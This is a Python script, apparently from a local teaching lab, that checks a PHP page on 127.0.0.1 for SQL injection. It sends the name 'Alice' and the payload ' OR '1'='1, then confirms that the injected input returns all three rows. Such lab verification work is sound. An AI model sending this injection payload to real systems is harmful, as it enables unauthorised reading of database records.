#!/usr/bin/env python3
import re
import sys
import urllib.parse
import urllib.request

# 仅允许本地教学目标
BASE = "http://127.0.0.1:4280/lab_cases/S001/index.php"

def fetch(name):
    url = BASE + "?" + urllib.parse.urlencode({"name": name})
    req = urllib.request.Request(url, headers={"User-Agent": "S001-local-audit"})
    with urllib.request.urlopen(req, timeout=5) as resp:
        body = resp.read().decode("utf-8", errors="replace")
        status = resp.status
    rows = re.findall(r'<p>ID\s+(\d+)：([^<]*)</p>', body)
    return status, rows

def main():
    normal_name = "Alice"
    test_name = "' OR '1'='1"

    try:
        normal_status, normal_rows = fetch(normal_name)
        test_status, test_rows = fetch(test_name)
    except Exception as exc:
        print("请求失败：", exc)
        print("请检查服务是否运行、入口URL是否正确、common/db_connect.php是否可连接数据库。")
        sys.exit(2)

    print("普通输入 Alice：HTTP", normal_status, "解析行=", normal_rows)
    print("测试输入 ' OR '1'='1：HTTP", test_status, "解析行=", test_rows)

    normal_ok = normal_rows == [("1", "Alice")]
    test_ids = {row[0] for row in test_rows}
    test_ok = len(test_rows) == 3 and test_ids == {"1", "2", "3"}

    if normal_ok and test_ok:
        print("观察结果符合SQL注入路径：普通输入仅返回 Alice，测试输入返回三行。")
    else:
        print("观察结果不符合预期；请检查入口、$db连接、lab_people预置数据、URL及MariaDB SQL模式。")
        sys.exit(1)

if __name__ == "__main__":
    main()
